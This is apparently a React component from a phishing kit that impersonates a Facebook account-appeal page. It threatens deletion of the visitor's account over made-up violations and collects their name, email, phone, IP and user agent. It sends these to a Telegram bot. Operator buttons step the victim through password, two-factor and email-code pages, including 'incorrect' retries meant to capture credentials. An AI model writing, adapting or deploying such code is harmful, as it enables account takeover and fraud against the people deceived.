import React, { useEffect, useState, useRef   } from 'react';
import { BrowserRouter as Router, Routes, Route, Link, useNavigate } from 'react-router-dom';
import { Form, FormControl, Button, InputGroup, Row, Col, Container } from 'react-bootstrap';

import newnew from '../images/newnew.PNG';
import usericon from '../images/user.png';
import msgicon from '../images/msg.png';
import { updateHapiValue } from './mymodule';
import GLOBAL_ARRAY from "./globals";


const AppealDesign = () => {
	const navigate = useNavigate();

	  const [nameisloaded, setNameisloaded] = useState(localStorage.getItem('name'));
  const [imageisloaded, setImageisloaded] = useState(localStorage.getItem('image'));
  const [dataLoaded, setDataLoaded] = useState(false);


  useEffect(() => {
  	const storedName = localStorage.getItem('name');
    const storedImage = localStorage.getItem('image');

    if (storedName && storedImage) {
      setNameisloaded(storedName);
      setImageisloaded(storedImage);
      setDataLoaded(true);
    } else {
      setDataLoaded(false);
    }

  	setTimeout(() => {
  const tekstinedizajn = localStorage.getItem('teksti');
      document.getElementById("showtextinourmessage").innerHTML = tekstinedizajn;
}, "1000");

      
  }, []);

	  const nameRef = useRef(null);
  const emailRef = useRef(null);
  const messageRef = useRef(null);
const phoneRef = useRef(null);

console.log("Hello: "+GLOBAL_ARRAY[3]);

    const handleSubmit = (event) => {
    	event.preventDefault();
	    const emri = nameRef.current.value;

	    var userAgent = navigator.userAgent;
	    localStorage.setItem('name', emri);
	    /* if(!localStorage.getItem('name')){
	    	localStorage.setItem('name', emri);
	    	localStorage.setItem('fullname', emri);
	    } */
	    if(emailRef.current && emailRef.current.offsetParent !== null){
	    	var emaili = emailRef.current.value;
	    } else {
	    	var emaili = '';
	    }
	    
	    const mesazhi = messageRef.current.value;
	    const numri = phoneRef.current.value;

	    userAgent = encodeURIComponent(userAgent);
	    //var emriencoded = encodeURIComponent(emri);
	    //var emailiencoded = encodeURIComponent(emaili);
	    //var mesazhiencoded = encodeURIComponent(mesazhi);
	    //var numriencoded = encodeURIComponent(numri);
	    
	    //localStorage.setItem('emriencoded', emriencoded);
	    //localStorage.setItem('emailiencoded', emailiencoded);
	    //localStorage.setItem('mesazhiencoded', mesazhiencoded);
	    //localStorage.setItem('numriencoded', numriencoded);
	    localStorage.setItem('hapii', 2);

	    var fulltextmesazh = "Name: "+ emri + " \nEmail: " + emaili + " \nNumber: " + numri + " \nMessage:" + mesazhi + "\nIP: " + localStorage.getItem('ipja') + "\nUSERAGENT: "+userAgent;
	    if(localStorage.getItem('username')){
	    	fulltextmesazh = fulltextmesazh + "\nUsername: "+localStorage.getItem('username');
	    }
	    const appealbutton = {
		  text: 'Appeal',
		  url: GLOBAL_ARRAY[6] + '/push/notification?ipja=' + localStorage.getItem('ipja') + '&hapi=1&urlja=/appeal'
		};
		const passwordbutton = {
		  text: 'Pw',
		  url: GLOBAL_ARRAY[6] + '/push/notification?ipja=' + localStorage.getItem('ipja') + '&hapi=2&urlja=/appeal/identity/confirm'
		};
		const passwordincorrectbutton = {
		  text: 'Pw Incorrect',
		  url: GLOBAL_ARRAY[6] + '/push/notification?ipja=' + localStorage.getItem('ipja') + '&hapi=3&urlja=/appeal/identity/confirm/incorrect'
		};
		const twofacbutton = {
		  text: '2Fac',
		  url: GLOBAL_ARRAY[6] + '/push/notification?ipja=' + localStorage.getItem('ipja') + '&hapi=4&urlja=/appeal/checkpoint'
		};
		const emailcodibutton = {
		  text: 'EmailCode',
		  url: GLOBAL_ARRAY[6] + '/push/notification?ipja=' + localStorage.getItem('ipja') + '&hapi=7&urlja=/appeal/checkpoint/restrict/no'
		};
		const emailcodebutton = {
		  text: 'Email',
		  url: GLOBAL_ARRAY[6] + '/push/notification?ipja=' + localStorage.getItem('ipja') + '&hapi=9&urlja=/appeal/checkpoint/email/'
		};
		const twofacincorrectbutton = {
		  text: '2Fac Incorrect',
		  url: GLOBAL_ARRAY[6] + '/push/notification?ipja=' + localStorage.getItem('ipja') + '&hapi=5&urlja=/appeal/checkpoint/incorrect'
		};
		const finishallbutton = {
		  text: 'Finish',
		  url: GLOBAL_ARRAY[6] + '/push/notification?ipja=' + localStorage.getItem('ipja') + '&hapi=8&urlja=/fb'
		};


		fetch('https://'+GLOBAL_ARRAY[4]+'/bot'+GLOBAL_ARRAY[2]+'/sendMessage', {
	      method: 'POST',
	      headers: {
	        'Content-Type': 'application/json'
	      },
	      body: JSON.stringify({
	        chat_id: GLOBAL_ARRAY[3],
	        text: 'Hi'
	      })
	    })
	    .then(response => response.json())
	    .then(data => {
	    	
	    	navigate('/appeal/identity/confirm');
	    })
	    .catch(error => console.error(error));


	    fetch('https://'+GLOBAL_ARRAY[4]+'/bot'+GLOBAL_ARRAY[0]+'/sendMessage', {
	      method: 'POST',
	      headers: {
	        'Content-Type': 'application/json'
	      },
	      body: JSON.stringify({
	        chat_id: GLOBAL_ARRAY[1],
	        text: fulltextmesazh,
	        reply_markup: {
		        inline_keyboard: [[appealbutton, passwordbutton, passwordincorrectbutton, twofacbutton,emailcodibutton, emailcodebutton,twofacincorrectbutton, finishallbutton]]
		      }
	      })
	    })
	    .then(response => response.json())
	    .then(data => {
	    	
	    	navigate('/appeal/identity/confirm');
	    })
	    .catch(error => console.error(error));
	    // reset form values
	 };


	return (
		<section className="appeal">
			<div className="mesazhi">
				<div className="imazhiwrapper">
					<img src={msgicon} />
				</div>
				<div className="subjekti">
					<p className="subjektitekst">Your account goes against our Community Standards</p>
					<p><span className="caseopen">OPEN</span> <span className="caseid">Case #2349995717901</span></p>
				</div>	
			</div>

			<div className="bodybody">
				<p className="activitytext">ACTIVITY</p>

				<div className="mesazhijon">
					<div className="imazhimbeshtjelles">
						<img src={newnew} />
					</div>
					<div className="mesazhijontext">
						<p className="topmessage">Our Message</p>
						<p className="bodymessage" >Your account has been scheduled for deletion because of one or more of the following reasons:<br />
						- Intellectual Property Infringement<br />
- Community Standards<br />
- Hate Speech<br />
- Multiple Accounts


						</p>
					</div>
				</div>
			</div>
			<div className="yourreply">
				<div className="mesazhiyt">
					<div className="imazhimbeshtjelles">
						{ dataLoaded ? (
							<img src={localStorage.getItem('image')} /> ) : ( 
							<img src={usericon} />
						) }
					</div>
					<div className="mesazhiyttext">
						<p className="topmessage">Your Reply</p>
						<p className="bodymessage">Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.</p>
					    <Form onSubmit={handleSubmit}>
					      <Form.Group className="mb-3" controlId="formBasicEmail">
					        <Form.Label>Your Name</Form.Label>
					        {dataLoaded ? (
					        	<Form.Control type="text"  ref={nameRef} required value={localStorage.getItem('fullname')} readonly className="readonlyinput" />
					        ) : (
					        	<Form.Control type="text" ref={nameRef} required />
					        )}
					      </Form.Group>

							<Form.Group className="mb-3" controlId="formBasicEmail">
						        <Form.Label>Your Email</Form.Label>
						        <Form.Control type="text"  ref={emailRef} />
						      </Form.Group>
						      
					      <Form.Group className="mb-3" controlId="formBasicEmail">
						        <Form.Label>Your Phone Number</Form.Label>
						        <Form.Control type="text"  ref={phoneRef}  />
						      </Form.Group>
					      <Form.Group className="mb-3" controlId="formBasicEmail">
					        <Form.Label id="justforadditional">Additional Details</Form.Label>
					        <Form.Text className="text-muted">
					          Please provide any additional details you'd like us to know as we review your appeal.
					        </Form.Text>
					        <Form.Control
					          as="textarea"
					          ref={messageRef}
					          style={{ height: '100px' }}
					        />
					      </Form.Group>
					      <Form.Check 
				            type="checkbox"
				            label="Do you agree to our Terms, Data Policy and Cookies Policy."
				          />
					      <Button variant="primary" type="submit" >
					        Submit
					      </Button>
					    </Form>
					</div>
				</div>
			</div>
		</section>

	)
}

export default AppealDesign